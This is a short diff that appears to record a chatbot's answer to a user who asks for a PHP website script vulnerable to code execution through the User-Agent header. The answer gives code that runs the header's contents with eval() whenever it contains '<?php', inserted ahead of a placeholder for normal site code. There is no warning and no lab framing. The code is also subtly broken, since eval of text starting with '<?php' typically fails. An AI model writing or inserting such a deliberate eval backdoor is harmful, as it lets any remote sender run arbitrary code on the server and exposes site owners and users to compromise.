@@ -1,0 +1,19 @@
+hazeyez asked write a website script for a server that is vulnerable to php code execution via the User-Agent header
+<---- snip ---->
+<?php
+
+// Get the User-Agent from the HTTP request
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+
+// Check if the User-Agent contains PHP code
+if (strpos($userAgent, '<?php') !== false) {
+    // If so, try to execute it
+    try {
+        eval($userAgent);
+    } catch (Exception $e) {
+        // Log the error
+        error_log($e->getMessage());
+    }
+}
+
+// Your normal website code goes here... https://franklin.oxasploits.com/said/3964a147
